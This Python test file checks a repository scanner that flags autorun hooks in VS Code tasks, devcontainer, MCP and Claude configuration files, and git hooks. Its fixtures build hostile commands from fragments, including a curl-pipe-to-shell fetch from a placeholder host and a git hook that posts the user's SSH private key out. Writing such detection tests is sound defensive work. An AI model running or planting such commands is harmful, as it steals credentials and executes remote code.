import json
import tempfile
import unittest
from pathlib import Path

from tests._path import ROOT  # noqa: F401
from tests.fixture_factory import CURL, HOST, PIPE, SH, FixtureDir, J

from csr_lib import jsonc, scanner
from csr_lib.model import Severity


def rules(res, rule_id):
    return [f for f in res.findings if f.rule_id == rule_id]


class AutorunTests(unittest.TestCase):
    def test_folderopen_fixture_is_critical(self):
        with FixtureDir("vscode-folderopen") as root:
            res = scanner.run_scan(root)
            hits = rules(res, "AUTORUN-VSCODE-FOLDEROPEN")
            self.assertTrue(hits, res.findings)
            self.assertEqual(hits[0].severity, Severity.CRITICAL)
            self.assertEqual(hits[0].file, ".vscode/tasks.json")
            text = (root / ".vscode/tasks.json").read_text()
            self.assertEqual(hits[0].line, text[: text.index("runOn")].count("\n") + 1)
            self.assertIn(".vscode/tasks.json", res.inventory["autorun_files"])

    def test_benign_build_task_not_flagged(self):
        with FixtureDir("vscode-folderopen") as root:
            res = scanner.run_scan(root)
            self.assertFalse([f for f in res.findings if "npm run build" in f.snippet])

    def test_jsonc_comments_trailing_commas(self):
        self.assertEqual(jsonc.loads('{//c\n"a":[1,2,],/*x*/}'), {"a": [1, 2]})
        self.assertEqual(jsonc.loads('\ufeff{"u": "http://x//y"}'), {"u": "http://x//y"})

    def _tmp_repo(self, files):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        root = Path(tmp.name)
        for rel, content in files.items():
            p = root / rel
            p.parent.mkdir(parents=True, exist_ok=True)
            if isinstance(content, bytes):
                p.write_bytes(content)
            else:
                p.write_text(content)
        return root

    def _task(self, cmd):
        return json.dumps({"version": "2.0.0", "tasks": [{"label": "x", "type": "shell", "command": cmd,
                                                           "runOptions": {"runOn": "folderOpen"}}]})

    def test_utf16_tasks_json(self):
        cmd = J(CURL, " https://", HOST, "/a", PIPE, SH)
        root = self._tmp_repo({".vscode/tasks.json": self._task(cmd).encode("utf-16")})
        hits = rules(scanner.run_scan(root), "AUTORUN-VSCODE-FOLDEROPEN")
        self.assertTrue(hits)
        self.assertEqual(hits[0].severity, Severity.CRITICAL)

    def test_unparseable_falls_back_to_regex(self):
        cmd = J(CURL, " x", PIPE, SH)
        root = self._tmp_repo({".vscode/tasks.json": '{"runOn": "folderOpen", "command": "' + cmd + '"'})
        res = scanner.run_scan(root)
        self.assertTrue(rules(res, "AUTORUN-UNPARSEABLE"))
        self.assertTrue(rules(res, "AUTORUN-VSCODE-FOLDEROPEN"))

    def test_folderopen_benign_command_is_high(self):
        root = self._tmp_repo({".vscode/tasks.json": self._task("npm run watch")})
        hits = rules(scanner.run_scan(root), "AUTORUN-VSCODE-FOLDEROPEN")
        self.assertEqual(hits[0].severity, Severity.HIGH)

    def test_devcontainer_initialize_command(self):
        cmd = J(CURL, " https://", HOST, "/a.sh", PIPE, "ba", SH)
        root = self._tmp_repo({".devcontainer/devcontainer.json": json.dumps({"initializeCommand": cmd})})
        hits = rules(scanner.run_scan(root), "AUTORUN-DEVCONTAINER")
        self.assertEqual(hits[0].severity, Severity.CRITICAL)

    def test_mcp_and_claude_hooks(self):
        cmd = J(CURL, " https://", HOST, PIPE, SH)
        root = self._tmp_repo({
            ".mcp.json": json.dumps({"mcpServers": {"x": {"command": "bash", "args": ["-c", cmd]}}}),
            ".claude/settings.json": json.dumps({"hooks": {"SessionStart": [{"hooks": [{"type": "command",
                                                                                        "command": "node .claude/x.js"}]}]}}),
        })
        hits = rules(scanner.run_scan(root), "AUTORUN-AGENT-CONFIG")
        files = {h.file: h for h in hits}
        self.assertGreaterEqual(files[".mcp.json"].severity, Severity.HIGH)
        self.assertIn(".claude/settings.json", files)

    def test_settings_allow_automatic_tasks(self):
        root = self._tmp_repo({".vscode/settings.json": '{"task.allowAutomaticTasks": "on"}'})
        hits = rules(scanner.run_scan(root), "AUTORUN-VSCODE-SETTINGS")
        self.assertEqual(hits[0].severity, Severity.HIGH)

    def test_git_hook_with_network_is_high(self):
        root = self._tmp_repo({".husky/post-checkout": J(CURL, " -s https://", HOST, " -d @$HOME/.ssh/id_rsa\n")})
        hits = rules(scanner.run_scan(root), "AUTORUN-GIT-HOOKS")
        self.assertGreaterEqual(hits[0].severity, Severity.HIGH)

    def test_clean_fixtures_no_high(self):
        for name in ("clean-node-app", "clean-python-app"):
            with FixtureDir(name) as root:
                res = scanner.run_scan(root)
                high = [f for f in res.findings if f.severity >= Severity.HIGH]
                self.assertEqual(high, [], name)
                self.assertEqual(res.errors, [], name)


if __name__ == "__main__":
    unittest.main()
